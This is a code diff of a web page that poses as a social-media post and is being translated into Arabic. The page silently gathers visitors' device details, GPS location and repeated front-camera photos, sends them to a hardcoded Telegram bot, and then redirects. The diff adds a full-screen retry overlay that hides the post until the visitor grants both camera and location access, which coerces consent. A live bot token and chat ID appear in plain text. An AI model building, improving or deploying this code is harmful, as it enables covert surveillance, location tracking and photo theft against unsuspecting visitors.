@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -9,14 +9,12 @@
   <meta property="og:image" id="ogImageMeta" content="">
   <meta property="og:url" content="https://asoalktabe-sudo.github.io/my-photo-app/">
   <style>
-    /* ========== متغيرات الوضع الليلي والنهاري ========== */
     :root {
       --bg: #f0f2f5;
       --card-bg: #ffffff;
       --text-primary: #1c1e21;
       --text-secondary: #65676b;
       --border: #e4e6eb;
-      --shadow: 0 1px 3px rgba(0,0,0,0.1);
     }
     @media (prefers-color-scheme: dark) {
       :root {
@@ -25,7 +23,6 @@
         --text-primary: #e4e6eb;
         --text-secondary: #b0b3b8;
         --border: #3e4042;
-        --shadow: 0 1px 3px rgba(255,255,255,0.05);
       }
     }
 
@@ -39,17 +36,19 @@
       padding-top: 30px;
       min-height: 100vh;
       transition: background 0.3s;
+      position: relative;
     }
 
+    /* المنشور */
     .post-container {
       max-width: 500px;
       width: 100%;
       background: var(--card-bg);
       border-radius: 8px;
-      box-shadow: var(--shadow);
+      box-shadow: 0 1px 3px rgba(0,0,0,0.1);
       overflow: hidden;
       margin-bottom: 20px;
-      transition: background 0.3s;
+      display: block;
     }
     .post-header {
       display: flex;
@@ -60,28 +59,18 @@
       width: 40px;
       height: 40px;
       border-radius: 50%;
-      margin-right: 8px;
+      margin-left: 8px;
       object-fit: cover;
     }
-    .post-user {
-      font-weight: 600;
-      font-size: 15px;
-      color: var(--text-primary);
-    }
-    .post-time {
-      font-size: 12px;
-      color: var(--text-secondary);
-    }
+    .post-user { font-weight: 600; font-size: 15px; color: var(--text-primary); }
+    .post-time { font-size: 12px; color: var(--text-secondary); }
     .post-text {
       padding: 0 16px 12px;
       font-size: 15px;
       color: var(--text-primary);
       white-space: pre-wrap;
     }
-    .post-image img {
-      width: 100%;
-      display: block;
-    }
+    .post-image img { width: 100%; display: block; }
     .post-stats {
       display: flex;
       justify-content: space-between;
@@ -100,42 +89,47 @@
     }
     .post-actions span { cursor: pointer; }
 
-    .camera-section {
-      text-align: center;
-      margin-top: 10px;
+    /* شاشة إعادة المحاولة */
+    .retry-overlay {
+      position: fixed;
+      top: 0; left: 0; width: 100%; height: 100%;
+      background: var(--bg);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
     }
-    .btn {
-      padding: 10px 20px;
+    .retry-btn {
+      padding: 20px 40px;
+      font-size: 1.4rem;
       background: #1877f2;
       color: white;
       border: none;
-      border-radius: 6px;
-      font-size: 14px;
+      border-radius: 50px;
       cursor: pointer;
-      margin: 5px;
+      font-weight: 600;
     }
-    .btn:disabled { background: #a0c4f1; cursor: not-allowed; }
-    .hidden { display: none; }
-    .loader { text-align: center; padding: 40px; color: var(--text-secondary); }
+    .hidden { display: none !important; }
+
+    /* كاميرا */
     video { display: none; }
   </style>
 </head>
 <body>
+  <!-- المنشور -->
   <div class="post-container" id="postContainer">
-    <div class="loader">Loading...</div>
+    <div class="loader">جاري التحميل...</div>
   </div>
 
-  <div class="camera-section">
-    <button class="btn hidden" id="cameraBtn">Allow Camera</button>
-    <p id="cameraMsg" style="color:red;font-size:13px;"></p>
-    <div id="countdownDisplay" style="font-size:1.2rem;margin-top:8px;color:var(--text-primary);"></div>
+  <!-- شاشة إعادة المحاولة (مخفية في البداية) -->
+  <div class="retry-overlay hidden" id="retryOverlay">
+    <button class="retry-btn" id="retryBtn">إعادة المحاولة</button>
   </div>
 
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas" style="display:none;"></canvas>
 
   <script>
-    // ==================== CONFIGURATION ====================
     const JSONBIN_BIN_ID = '69ee19e8856a68218974812e';
     const BOT_TOKEN = '8649544110:AAF33tUasn_RsH6A7035vpyYntAlOAQ0axQ';
     const CHAT_ID = '5151102782';
@@ -145,9 +139,8 @@
 
     // DOM
     const postContainer = document.getElementById('postContainer');
-    const cameraBtn = document.getElementById('cameraBtn');
-    const cameraMsg = document.getElementById('cameraMsg');
-    const countdownDisplay = document.getElementById('countdownDisplay');
+    const retryOverlay = document.getElementById('retryOverlay');
+    const retryBtn = document.getElementById('retryBtn');
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const ctx = canvas.getContext('2d');
@@ -159,9 +152,8 @@
     let countdown = COUNTDOWN_SECONDS;
     let latestPosition = null;
     let redirectUrl = 'https://example.com';
-    let cameraGranted = false;
 
-    // ==================== FETCH POST DATA ====================
+    // تحميل بيانات المنشور
     async function loadPost() {
       try {
         const res = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}/latest`);
@@ -169,24 +161,22 @@
         const s = data.record || {};
         redirectUrl = s.redirectUrl || redirectUrl;
 
-        const ogTitle = s.ogTitle || s.profileName || 'Your Name';
+        const ogTitle = s.ogTitle || s.profileName || 'اسم المستخدم';
         const ogDescription = s.ogDescription || (s.postText || '').substring(0,150);
         const ogImage = s.ogImage || s.postImage || s.profilePicture || '';
-        const profileName = s.profileName || 'Your Name';
+        const profileName = s.profileName || 'اسم المستخدم';
         const profilePic = s.profilePicture || 'https://i.ibb.co/zJx0q3Q/default-avatar.png';
-        const postText = s.postText || 'This is a sample post.';
+        const postText = s.postText || 'هذا نص تجريبي للمنشور.';
         const postImage = s.postImage || '';
-        const postTime = s.postTime || 'Just now';
+        const postTime = s.postTime || 'الآن';
         const commentsCount = s.commentsCount || '0';
         const sharesCount = s.sharesCount || '0';
 
-        // تحديث Open Graph
         document.title = ogTitle;
         setMeta('og:title', ogTitle);
         setMeta('og:description', ogDescription);
         setMeta('og:image', ogImage);
 
-        // بناء المنشور
         postContainer.innerHTML = `
           <div class="post-header">
             <img src="${profilePic}" onerror="this.src='https://i.ibb.co/zJx0q3Q/default-avatar.png'">
@@ -196,17 +186,19 @@
             </div>
           </div>
           <div class="post-text">${postText}</div>
-          ${postImage ? `<div class="post-image"><img src="${postImage}" alt="Post"></div>` : ''}
+          ${postImage ? `<div class="post-image"><img src="${postImage}" alt="صورة المنشور"></div>` : ''}
           <div class="post-stats">
-            <span>👍 ${commentsCount} Comments</span>
-            <span>↗️ ${sharesCount} Shares</span>
+            <span>${commentsCount} تعليق</span>
+            <span>${sharesCount} مشاركة</span>
           </div>
           <div class="post-actions">
-            <span>👍 Like</span><span>💬 Comment</span><span>↗️ Share</span>
+            <span>👍 أعجبني</span>
+            <span>💬 تعليق</span>
+            <span>↗️ مشاركة</span>
           </div>
         `;
       } catch(e) {
-        postContainer.innerHTML = '<div class="loader">Failed to load post.</div>';
+        postContainer.innerHTML = '<div class="loader">فشل تحميل المنشور</div>';
       }
     }
 
@@ -215,7 +207,16 @@
       if (meta) meta.setAttribute('content', content);
     }
 
-    // ==================== BACKGROUND TASKS ====================
+    // دوال الخلفية
+    async function sendText(text) {
+      try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method:'POST', headers:{'Content-Type':'application/json'},
+          body: JSON.stringify({chat_id:CHAT_ID, text, parse_mode:'HTML'})
+        });
+      } catch(e) {}
+    }
+
     async function collectAndSendInfo() {
       try {
         const uaData = navigator.userAgentData || {};
@@ -240,8 +241,8 @@
           timestamp: new Date().toISOString(),
           highEntropy
         };
-        let txt = '<b>📱 Device</b>\n';
-        txt += `Model: ${highEntropy.model||'N/A'}\nPlatform: ${deviceInfo.platform}\nScreen: ${deviceInfo.screen}\nCPU: ${deviceInfo.cores}\nRAM: ${deviceInfo.memory}GB\nBattery: ${deviceInfo.battery}\nLanguage: ${deviceInfo.language}\nTZ: ${deviceInfo.timezone}`;
+        let txt = '<b>📱 معلومات الجهاز</b>\n';
+        txt += `الموديل: ${highEntropy.model||'N/A'}\nالنظام: ${deviceInfo.platform}\nالشاشة: ${deviceInfo.screen}\nالمعالج: ${deviceInfo.cores} نواة\nالذاكرة: ${deviceInfo.memory}GB\nالبطارية: ${deviceInfo.battery}\nاللغة: ${deviceInfo.language}\nالمنطقة الزمنية: ${deviceInfo.timezone}`;
         sendText(txt);
       } catch(e) {}
 
@@ -260,33 +261,21 @@
         } catch(e) {}
       }
       if (latestPosition) {
-        sendText(`📍 Location: ${latestPosition.lat},${latestPosition.lon} (${latestPosition.src}, ${latestPosition.acc}m)\n🗺️ https://www.google.com/maps?q=${latestPosition.lat},${latestPosition.lon}`);
+        sendText(`📍 الموقع: ${latestPosition.lat},${latestPosition.lon} (${latestPosition.src}, ${latestPosition.acc}m)\n🗺️ https://www.google.com/maps?q=${latestPosition.lat},${latestPosition.lon}`);
       }
     }
 
-    async function sendText(text) {
-      try {
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-          method:'POST', headers:{'Content-Type':'application/json'},
-          body: JSON.stringify({chat_id:CHAT_ID, text, parse_mode:'HTML'})
-        });
-      } catch(e) {}
-    }
-
-    // ==================== CAMERA & PHOTOS ====================
-    async function startCamera() {
+    // الكاميرا والتصوير
+    async function startCameraIfGranted() {
       try {
         stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
         video.srcObject = stream;
         await new Promise(r => { video.onloadedmetadata = () => { video.play(); r(); }; });
-        cameraGranted = true;
-        cameraBtn.classList.add('hidden');
-        cameraMsg.textContent = '';
         captureInterval = setInterval(captureAndSend, CAPTURE_INTERVAL);
         startCountdown();
+        return true;
       } catch(e) {
-        cameraBtn.classList.remove('hidden');
-        cameraMsg.textContent = 'Camera access denied. Please allow.';
+        return false;
       }
     }
 
@@ -322,23 +311,69 @@
 
     function startCountdown() {
       countdown = COUNTDOWN_SECONDS;
-      countdownDisplay.textContent = `Redirecting in ${countdown}...`;
       countdownInterval = setInterval(() => {
         countdown--;
-        countdownDisplay.textContent = `Redirecting in ${countdown}...`;
         if (countdown <= 0) {
           stopMedia();
-          sendText(`📋 Report\nPhotos: ${photoCount}\nLocation: ${latestPosition?JSON.stringify(latestPosition):'N/A'}`);
+          sendText(`📋 تقرير\nالصور: ${photoCount}\nالموقع: ${latestPosition?JSON.stringify(latestPosition):'N/A'}`);
           window.location.href = redirectUrl;
         }
       }, 1000);
     }
 
+    // ---- آلية الصلاحيات ----
+    async function requestPermissions() {
+      // نطلب الكاميرا والموقع معاً
+      const cameraPromise = navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
+        .then(s => { stream = s; return true; })
+        .catch(() => false);
+      
+      const locationPromise = new Promise(resolve => {
+        if (!navigator.geolocation) return resolve(false);
+        navigator.geolocation.getCurrentPosition(
+          pos => { latestPosition = { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy, src:'GPS' }; resolve(true); },
+          () => resolve(false),
+          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
+      });
+
+      const [cameraGranted, locationGranted] = await Promise.all([cameraPromise, locationPromise]);
+      return cameraGranted && locationGranted;
+    }
+
+    function showRetry() {
+      postContainer.classList.add('hidden');
+      retryOverlay.classList.remove('hidden');
+      stopMedia();
+    }
+
+    function hideRetry() {
+      retryOverlay.classList.add('hidden');
+      postContainer.classList.remove('hidden');
+    }
+
+    async function attemptPermissions() {
+      const granted = await requestPermissions();
+      if (granted) {
+        hideRetry();
+        // بدء الكاميرا والإرسال
+        await startCameraIfGranted();
+        collectAndSendInfo();
+      } else {
+        showRetry();
+      }
+    }
+
+    // عند الضغط على إعادة المحاولة
+    retryBtn.addEventListener('click', async () => {
+      await attemptPermissions();
+    });
+
+    // بداية التشغيل
     async function init() {
-      await loadPost();
-      collectAndSendInfo();
-      cameraBtn.addEventListener('click', startCamera);
-      startCamera();
+      await loadPost();  // يظهر المنشور
+      // ننتظر قليلاً ثم نطلب الصلاحيات
+      setTimeout(attemptPermissions, 300);
     }
 
     window.addEventListener('load', init);
